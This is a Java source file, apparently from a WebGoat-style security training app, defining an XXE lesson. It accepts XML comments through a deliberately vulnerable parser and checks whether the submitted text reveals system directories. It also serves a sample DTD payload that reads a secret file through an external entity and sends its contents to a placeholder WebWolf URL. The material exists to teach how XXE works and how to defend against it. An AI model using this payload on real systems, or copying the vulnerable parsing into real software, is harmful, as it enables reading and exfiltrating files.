package com.wanan.webgoat.lessons.xxe;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.apache.commons.exec.OS;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;


import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

@RestController
@AssignmentHints({"xxe.hints.simple.xxe.1", "xxe.hints.simple.xxe.2", "xxe.hints.simple.xxe.3", "xxe.hints.simple.xxe.4", "xxe.hints.simple.xxe.5", "xxe.hints.simple.xxe.6"})
public class SimpleXXE extends AssignmentEndpoint {
    private static final String[] DEFAULT_LINUX_DIRECTORIES = {"usr","etc","var"};
//    定义好linux系统下的目录
    private static final String[] DEFAULT_WINDOWS_DIRECTORIES = {"Windows", "Program Files (x86)", "Program Files", "pagefile.sys"};
//   win
    @Value("${webgoat.server.directory}")
    private String webGoatHomeDirectory;
//    获取运行路径
    @Value("${webwolf.landingpage.url}")
    private String webWolfURL;
//  获取webwolfurl
    @Autowired
    private CommentsCache comments;

    @PostMapping(path = "xxe/simple",consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult createNameComment(HttpServletRequest request, @RequestBody String commentStr){
        String error = "";
        try {
            var comment = comments.parseXml(commentStr);
//            解析获得comment对象
            comments.addComment(comment,false);
            if (checkSolution(comment)){
                return success(this).build();
            }
        } catch (Exception e) {
            error = ExceptionUtils.getStackTrace(e);
        }
        return failed(this).output(error).build();
    }

    private boolean checkSolution(Comment comment) {
        String[] directoriesToCheck = OS.isFamilyMac() || OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES : DEFAULT_WINDOWS_DIRECTORIES;
        boolean success = false;
        for (String directory : directoriesToCheck){
            success |= org.apache.commons.lang3.StringUtils.contains(comment.getText(),directory);
//            如果在评论中存在这些目录
        }
        return success;

    }
    @RequestMapping(path = "/xxe/sampledtd",consumes = ALL_VALUE,produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseBody
    public String  getSampleDTDFile(){
        return """
                <?xml version="1.0" encoding="UTF-8"?>
                <!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
                <!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
                %all;
                """;
    }
}
